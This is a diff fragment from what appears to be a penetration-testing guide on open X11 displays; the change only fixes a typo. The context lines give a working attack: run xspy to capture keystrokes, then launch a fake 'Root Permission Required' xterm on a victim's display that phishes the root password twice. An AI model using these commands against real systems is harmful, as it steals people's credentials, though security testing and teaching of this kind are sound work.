@@ -173,7 +173,7 @@ This was tested against Ubuntu 12.04, 14.04, 16.04 and Solaris 10.
 
 1. start `xspy`
 2. `xterm -T "Root Permission Required" -display [ip]:0 -e "echo -e -n 'root password: '; read passwd; echo 'Authentication Failure'; echo -e -n 'root password: '; read passwd"`
-  - Notice it asks twice for the password incase of a mistyped initial password.  This can also be adjusted to just say password or the real user's username
+  - Notice it asks twice for the password in case of a mistyped initial password.  This can also be adjusted to just say password or the real user's username
   - The victim's typed text by the user will not be masked (`*`)
 
 ### Direct Exploitation
